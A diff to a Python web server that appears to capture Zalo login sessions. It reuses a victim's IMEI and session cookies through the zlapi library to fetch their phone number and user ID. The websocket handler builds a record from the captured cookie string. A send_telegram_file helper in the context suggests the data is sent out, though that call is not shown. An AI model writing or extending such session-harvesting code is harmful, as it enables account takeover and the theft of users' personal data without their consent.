@@ -94,21 +94,47 @@ async def send_telegram_file(content: bytes, filename: str, caption: str):
         except:
             pass
 
-def get_phone_from_zlapi(imei: str, cookie: dict) -> str:
+def get_info_from_zlapi(imei: str, cookie: dict) -> dict:
+    result = {"phone": None, "uid": None}
     try:
-        from zlapi.models import Bot
-        b = Bot("1502257077756629012", "1408873439028183142", imei, cookie)
-        phone = b._state._config.get("phone_number")
-        if phone:
-            return str(phone)
-        info = b.fetchAccountInfo()
-        if info and hasattr(info, "profile"):
-            p = info.profile.get("phoneNumber") or info.profile.get("phone")
-            if p:
-                return str(p)
-    except:
-        pass
-    return None
+        from zlapi import ZaloAPI
+        b = ZaloAPI("_", "_", imei, session_cookies=cookie)
+        result["uid"] = str(b._state.user_id) if b._state.user_id else None
+        result["phone"] = b._state._config.get("phone_number") or None
+        if result["phone"]:
+            result["phone"] = str(result["phone"])
+        if not result["phone"] or not result["uid"]:
+            info = b.fetchAccountInfo()
+            if info:
+                profile = info.profile if hasattr(info, "profile") else (info if isinstance(info, dict) else {})
+                if isinstance(profile, dict):
+                    if not result["phone"]:
+                        p = (profile.get("phoneNumber") or profile.get("phone")
+                             or profile.get("phone_number") or profile.get("msisdn")
+                             or profile.get("mobile"))
+                        if p:
+                            result["phone"] = str(p)
+                    if not result["uid"]:
+                        u = (profile.get("userId") or profile.get("uid") or profile.get("id"))
+                        if u:
+                            result["uid"] = str(u)
+                else:
+                    if not result["phone"]:
+                        for f in ["phoneNumber", "phone", "phone_number", "msisdn", "mobile"]:
+                            v = getattr(info, f, None) or (profile.get(f) if hasattr(profile, "get") else None)
+                            if v:
+                                result["phone"] = str(v)
+                                break
+                    if not result["uid"]:
+                        for f in ["userId", "uid", "id"]:
+                            v = getattr(info, f, None)
+                            if v:
+                                result["uid"] = str(v)
+                                break
+    except Exception as e:
+        import logging
+        logging.getLogger("server").warning(f"[zlapi] get_info_from_zlapi error: {e}")
+    return result
 
 # ── Auth middleware helper ───────────────────────────────────────────────────
 def get_token_from_request(request: Request) -> str:
@@ -310,18 +336,24 @@ async def ws_endpoint(ws: WebSocket, session_id: str):
         cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
         now        = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
 
-        phone = user.get("phoneNumber") or user.get("phone", "")
-        if not phone or phone == "N/A":
+        phone = (user.get("phoneNumber") or user.get("phone") or user.get("phone_number") or user.get("msisdn") or user.get("mobile") or "")
+        uid   = (user.get("userId") or user.get("uid") or user.get("id") or "")
+
+        if not phone or phone == "N/A" or not uid or uid == "N/A":
             try:
                 loop = asyncio.get_event_loop()
-                phone = await loop.run_in_executor(None, get_phone_from_zlapi, imei, cookies)
-                if phone:
+                zlapi_info = await loop.run_in_executor(None, get_info_from_zlapi, imei, cookies)
+                if not phone or phone == "N/A":
+                    phone = zlapi_info.get("phone") or phone
                     user["phoneNumber"] = phone
+                if not uid or uid == "N/A":
+                    uid = zlapi_info.get("uid") or uid
+                    user["userId"] = uid
             except:
                 pass
 
         name  = user.get("displayName") or user.get("name", "N/A")
-        uid   = user.get("userId") or user.get("id", "N/A")
+        uid   = user.get("userId", "N/A") or "N/A"
         phone = user.get("phoneNumber", "Không rõ") or "Không rõ"
 
         record = {
